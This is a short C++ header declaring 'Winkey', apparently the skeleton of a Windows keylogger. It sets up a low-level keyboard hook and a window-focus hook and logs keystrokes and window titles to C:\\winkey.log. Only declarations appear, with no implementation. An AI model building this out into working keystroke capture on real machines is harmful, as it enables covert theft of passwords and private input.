#pragma once

#include "sdk.h"
#include <ctime>
#pragma comment(lib, "user32.lib")

#define LOG_FILE TEXT("C:\\winkey.log")

HANDLE	gLogHandle;
TCHAR	gLastWindowTitle[512] = {0};
BOOL	gReportNextWindow = false;

class Winkey {
public:
	Winkey();
	~Winkey();

	int Hook();
	static LRESULT CALLBACK onKey(int nCode,
		WPARAM wParam,
		LPARAM lParam);
	static LRESULT CALLBACK onWindow(HWINEVENTHOOK hWinEventHook,
		DWORD event,
		HWND hwnd,
		LONG idObject,
		LONG idChild,
		DWORD idEventThread,
		DWORD dwmsEventTime);
	static std::string solve(KBDLLHOOKSTRUCT *kbdEv);
	static void logCurrentWindow();
};